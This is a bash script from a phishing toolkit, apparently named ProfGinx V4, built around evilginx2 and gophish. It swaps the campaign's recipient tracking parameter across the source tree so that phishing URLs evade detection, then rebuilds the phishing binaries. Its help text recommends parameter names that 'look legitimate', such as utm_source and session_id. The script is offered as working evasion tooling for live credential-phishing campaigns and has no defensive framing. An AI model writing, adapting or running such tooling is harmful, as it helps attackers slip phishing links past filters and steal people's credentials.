#!/usr/bin/env bash

# ProfGinx V4 - Safe RID Replacement Script
# Replaces tracking parameter names to evade detection
# Auto-detects current RID from source code

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

script_name="replace-rid"

print_good() {
    echo -e "[${script_name}] ${GREEN}[+]${NC} $1"
}

print_error() {
    echo -e "[${script_name}] ${RED}[-]${NC} $1"
}

print_warning() {
    echo -e "[${script_name}] ${YELLOW}[!]${NC} $1"
}

print_info() {
    echo -e "[${script_name}] ${BLUE}[*]${NC} $1"
}

# File extensions to modify (safe list)
SAFE_EXTENSIONS="go yaml yml json html js ts jsx tsx css md txt conf template"

# Directories to skip
SKIP_DIRS=".git node_modules vendor .evilginx evilginx2-TTPs"

# Auto-detect current RID from gophish source
detect_current_rid() {
    local rid_file="$SCRIPT_DIR/gophish/models/campaign.go"
    if [[ -f "$rid_file" ]]; then
        local current=""
        # Use Perl regex on Linux, fallback for macOS
        if [[ "$OSTYPE" == "linux-gnu"* ]]; then
            current=$(grep -oP 'RecipientParameter\s*=\s*"\K[^"]+' "$rid_file" 2>/dev/null)
        else
            current=$(grep 'RecipientParameter' "$rid_file" 2>/dev/null | grep -o '"[^"]*"' | tr -d '"' | head -1)
        fi
        if [[ -n "$current" ]]; then
            echo "$current"
            return 0
        fi
    fi
    # Fallback - search in gophish directory
    local fallback=""
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        fallback=$(grep -rhoP 'RecipientParameter\s*=\s*"\K[^"]+' --include="*.go" "$SCRIPT_DIR/gophish" 2>/dev/null | head -1)
    else
        fallback=$(grep -r 'RecipientParameter.*=' --include="*.go" "$SCRIPT_DIR/gophish" 2>/dev/null | grep -o '"[^"]*"' | tr -d '"' | head -1)
    fi
    if [[ -n "$fallback" ]]; then
        echo "$fallback"
        return 0
    fi
    echo ""
    return 1
}

# Count occurrences of a string in safe files
count_occurrences() {
    local search="$1"
    local count=0

    for ext in $SAFE_EXTENSIONS; do
        local found=$(find "$SCRIPT_DIR" -type f -name "*.$ext" $(printf "! -path '*/%s/*' " $SKIP_DIRS) -exec grep -l "$search" {} \; 2>/dev/null | wc -l)
        count=$((count + found))
    done
    echo "$count"
}

# List files that will be modified
list_affected_files() {
    local search="$1"

    print_info "Files that will be modified:"
    echo ""

    for ext in $SAFE_EXTENSIONS; do
        find "$SCRIPT_DIR" -type f -name "*.$ext" $(printf "! -path '*/%s/*' " $SKIP_DIRS) -exec grep -l "$search" {} \; 2>/dev/null | while read -r file; do
            local rel_path="${file#$SCRIPT_DIR/}"
            local matches=$(grep -c "$search" "$file" 2>/dev/null)
            echo -e "  ${CYAN}$rel_path${NC} (${matches} occurrences)"
        done
    done
    echo ""
}

# Perform the replacement
do_replace() {
    local old_rid="$1"
    local new_rid="$2"
    local files_modified=0

    for ext in $SAFE_EXTENSIONS; do
        find "$SCRIPT_DIR" -type f -name "*.$ext" $(printf "! -path '*/%s/*' " $SKIP_DIRS) -exec grep -l "$old_rid" {} \; 2>/dev/null | while read -r file; do
            # Use different sed syntax for macOS vs Linux
            if [[ "$OSTYPE" == "darwin"* ]]; then
                sed -i '' "s|${old_rid}|${new_rid}|g" "$file"
            else
                sed -i "s|${old_rid}|${new_rid}|g" "$file"
            fi
            files_modified=$((files_modified + 1))
        done
    done
}

# Show usage
show_usage() {
    echo -e "${CYAN}ProfGinx V4 - Safe RID Replacement${NC}"
    echo ""
    echo -e "${BLUE}Usage:${NC} ./replace_rid.sh [command] [options]"
    echo ""
    echo -e "${YELLOW}Commands:${NC}"
    echo "  detect              - Auto-detect current RID value"
    echo "  preview <new_rid>   - Preview changes without modifying files"
    echo "  replace <new_rid>   - Replace current RID with new value"
    echo "  replace <old> <new> - Replace specific old RID with new value"
    echo "  help                - Show this help message"
    echo ""
    echo -e "${YELLOW}Examples:${NC}"
    echo "  ./replace_rid.sh detect                    # Show current RID"
    echo "  ./replace_rid.sh preview user_token        # Preview what will change"
    echo "  ./replace_rid.sh replace user_token        # Auto-detect old, replace with new"
    echo "  ./replace_rid.sh replace client_id uid     # Replace client_id with uid"
    echo ""
    echo -e "${YELLOW}Recommended RID names (look legitimate):${NC}"
    echo "  user_id, session_id, token, ref, src, utm_source, cid, uid"
    echo "  client_id, request_id, visitor_id, tracking_id, campaign_id"
    echo ""
}

# Main logic
case "${1:-help}" in
    detect)
        current_rid=$(detect_current_rid)
        if [[ -n "$current_rid" ]]; then
            print_good "Current RID detected: ${CYAN}${current_rid}${NC}"
            occurrences=$(count_occurrences "$current_rid")
            print_info "Found in approximately ${occurrences} files"
        else
            print_error "Could not auto-detect RID. Check gophish/models/campaign.go"
        fi
        ;;

    preview)
        if [[ -z "$2" ]]; then
            print_error "Missing new RID parameter"
            echo "Usage: ./replace_rid.sh preview <new_rid>"
            exit 1
        fi

        new_rid="$2"
        current_rid=$(detect_current_rid)

        if [[ -z "$current_rid" ]]; then
            print_error "Could not auto-detect current RID"
            print_info "Use: ./replace_rid.sh replace <old_rid> <new_rid>"
            exit 1
        fi

        print_info "Current RID: ${CYAN}${current_rid}${NC}"
        print_info "New RID: ${CYAN}${new_rid}${NC}"
        echo ""

        occurrences=$(count_occurrences "$current_rid")
        print_info "Total files to modify: ${occurrences}"
        echo ""

        list_affected_files "$current_rid"

        print_warning "This is a preview. No files were modified."
        print_info "Run: ./replace_rid.sh replace ${new_rid}"
        ;;

    replace)
        if [[ -z "$2" ]]; then
            print_error "Missing RID parameter(s)"
            echo "Usage: ./replace_rid.sh replace <new_rid>"
            echo "   or: ./replace_rid.sh replace <old_rid> <new_rid>"
            exit 1
        fi

        # Check if we have 2 or 3 arguments
        if [[ -n "$3" ]]; then
            # Two RID arguments: old and new
            old_rid="$2"
            new_rid="$3"
        else
            # One RID argument: auto-detect old, use arg as new
            old_rid=$(detect_current_rid)
            new_rid="$2"

            if [[ -z "$old_rid" ]]; then
                print_error "Could not auto-detect current RID"
                print_info "Use: ./replace_rid.sh replace <old_rid> <new_rid>"
                exit 1
            fi
        fi

        # Validate
        if [[ "$old_rid" == "$new_rid" ]]; then
            print_error "Old and new RID are the same: ${old_rid}"
            exit 1
        fi

        print_info "Replacing RID: ${CYAN}${old_rid}${NC} -> ${GREEN}${new_rid}${NC}"
        echo ""

        # Count before
        occurrences=$(count_occurrences "$old_rid")
        print_info "Files to modify: ${occurrences}"

        if [[ "$occurrences" -eq 0 ]]; then
            print_warning "No files contain '${old_rid}'"
            exit 0
        fi

        # Confirm
        echo ""
        print_warning "This will modify source files. Make sure you have a backup!"
        read -p "Continue? (y/N): " confirm
        if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
            print_info "Aborted."
            exit 0
        fi

        # Do replacement
        echo ""
        print_info "Replacing in source files..."
        do_replace "$old_rid" "$new_rid"

        # Verify
        remaining=$(count_occurrences "$old_rid")
        if [[ "$remaining" -eq 0 ]]; then
            print_good "Replacement complete!"
        else
            print_warning "Some occurrences may remain in skipped directories"
        fi

        # Rebuild
        echo ""
        print_info "Rebuilding binaries..."

        # Check if go is available
        if ! command -v go &> /dev/null; then
            print_error "Go is not installed. Please rebuild manually."
            exit 1
        fi

        # Build evilginx2
        print_info "Building evilginx2..."
        if go build -o evilginx2 . 2>&1; then
            print_good "evilginx2 built successfully"
        else
            print_error "Failed to build evilginx2"
        fi

        # Build gophish
        print_info "Building gophish..."
        if (cd gophish && go build -o gophish . 2>&1); then
            print_good "gophish built successfully"
        else
            print_warning "gophish build failed (optional)"
        fi

        # Build evilfeed
        print_info "Building evilfeed..."
        if (cd evilfeed && go build -o evilfeed . 2>&1); then
            print_good "evilfeed built successfully"
        else
            print_warning "evilfeed build failed (optional)"
        fi

        echo ""
        print_good "RID replacement complete!"
        print_info "New RID: ${GREEN}${new_rid}${NC}"
        print_info "Phishing URLs will now use: ?${new_rid}=XXXXXX"
        ;;

    help|--help|-h|*)
        show_usage
        ;;
esac
